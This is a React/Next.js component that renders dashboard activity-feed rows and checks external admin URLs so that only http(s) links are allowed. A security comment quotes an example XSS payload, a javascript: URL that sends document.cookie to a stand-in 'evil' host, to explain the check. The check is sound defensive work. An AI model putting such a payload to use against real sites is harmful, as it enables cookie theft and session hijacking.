'use client';

import { useTranslations } from 'next-intl';
import { formatDistanceToNow } from 'date-fns';
import { Link } from '@/i18n/navigation';
import { ROUTES } from '@/lib/constants';
import { cn } from '@/lib/utils/cn';
import type { FeedEntry, PlatformActivityLogEntry } from '@/lib/api/works/activity-feed.types';
import { SyncEventRow } from './SyncEventRow';
import type { SyncEvent } from './SyncEvent.types';

interface FeedRowProps {
    entry: FeedEntry;
    workId: string;
}

function IconForSource({ source }: { source: FeedEntry['source'] }) {
    const colorClass =
        source === 'platform-activity-log' ? 'text-info bg-info/10' : 'text-success bg-success/10';

    return (
        <span
            className={cn(
                'flex h-8 w-8 shrink-0 items-center justify-center rounded-full',
                colorClass,
            )}
            aria-hidden="true"
        >
            <svg className="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M3 12h3l3-9 6 18 3-9h3"
                />
            </svg>
        </span>
    );
}

function isSyncEventDetails(details: unknown): details is SyncEvent {
    if (!details || typeof details !== 'object') return false;
    const kind = (details as { kind?: unknown }).kind;
    return kind === 'success' || kind === 'skipped' || kind === 'failed';
}

function isSyncActivity(entry: FeedEntry): entry is PlatformActivityLogEntry {
    return entry.source === 'platform-activity-log' && entry.category === 'sync';
}

function formatRelativeTime(timestamp: string): string {
    const date = new Date(timestamp);
    if (Number.isNaN(date.getTime())) return '';
    return formatDistanceToNow(date, { addSuffix: true });
}

/**
 * Security: `directory-site` entry `adminUrl` originates from the deployed
 * directory site fetched by the pull-mode data-sync client (untrusted external
 * content) and is rendered into an `<a href target="_blank">`. Without this an
 * operator/attacker returning `javascript:fetch('//evil/?c='+document.cookie)`
 * as `adminUrl` lands a working XSS — `rel="noopener noreferrer"` does not block
 * it. Returns `undefined` for anything that isn't http/https (including
 * non-string values, which throw in `new URL` and hit the catch). Mirrors
 * `safeExternalUrl` in ComparisonDetailClient.tsx / ItemCard.tsx.
 */
function safeExternalUrl(raw: string | undefined | null): string | undefined {
    if (!raw) return undefined;
    try {
        const parsed = new URL(raw);
        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
            return undefined;
        }
        return parsed.toString();
    } catch {
        return undefined;
    }
}

function entryHref(entry: FeedEntry, workId: string): { href: string; external: boolean } {
    if (entry.source === 'directory-site') {
        // Security: only render the external link for validated http(s) URLs;
        // an unsafe scheme falls through to an inert internal anchor (`#`).
        const safeUrl = safeExternalUrl(entry.target.adminUrl);
        if (safeUrl) {
            return { href: safeUrl, external: true };
        }
        return { href: '#', external: false };
    }
    if (entry.source === 'generation-history') {
        return {
            href: `${ROUTES.DASHBOARD_WORK_HISTORY(workId)}?run=${entry.runId}`,
            external: false,
        };
    }
    // Platform activity-log entries deep-link to the global activity view
    // filtered to this entry; ActivityDetailModal embedding can come later.
    return { href: `${ROUTES.DASHBOARD_ACTIVITY}?entry=${entry.id}`, external: false };
}

export function FeedRow({ entry, workId }: FeedRowProps) {
    const t = useTranslations('dashboard.workDetail.activity');
    const { href, external } = entryHref(entry, workId);
    const relative = formatRelativeTime(entry.timestamp);

    if (isSyncActivity(entry) && isSyncEventDetails(entry.details)) {
        return <SyncEventRow event={entry.details} />;
    }

    const content = (
        <div
            className={cn(
                'flex items-start gap-3 rounded-md border p-3 transition-colors',
                'border-border dark:border-border-dark',
                'bg-card dark:bg-card-primary-dark/30',
                'hover:bg-muted/30 dark:hover:bg-muted/10',
            )}
        >
            <IconForSource source={entry.source} />
            <div className="flex-1 min-w-0">
                <div className="flex items-baseline gap-2 flex-wrap">
                    <span className="text-sm font-medium text-text dark:text-text-dark truncate">
                        {entry.summary}
                    </span>
                    {relative && (
                        <span className="text-xs text-text-muted dark:text-text-muted-dark whitespace-nowrap">
                            {relative}
                        </span>
                    )}
                </div>
                <div className="mt-1 flex items-center gap-2 text-xs text-text-secondary dark:text-text-secondary-dark min-w-0">
                    <span className="rounded-full bg-muted/40 dark:bg-muted/20 px-2 py-0.5 font-medium">
                        {t(`filters.${entry.category}`)}
                    </span>
                    {entry.source === 'generation-history' && (
                        <span>
                            {t('entry.itemsSummary', {
                                added: entry.newItemsCount,
                                updated: entry.updatedItemsCount,
                            })}
                        </span>
                    )}
                </div>
            </div>
        </div>
    );

    if (external) {
        return (
            <a
                href={href}
                target="_blank"
                rel="noopener noreferrer"
                className="block rounded-md focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2 focus-visible:ring-offset-background"
            >
                {content}
            </a>
        );
    }

    return (
        <Link
            href={href}
            className="block rounded-md focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2 focus-visible:ring-offset-background"
        >
            {content}
        </Link>
    );
}
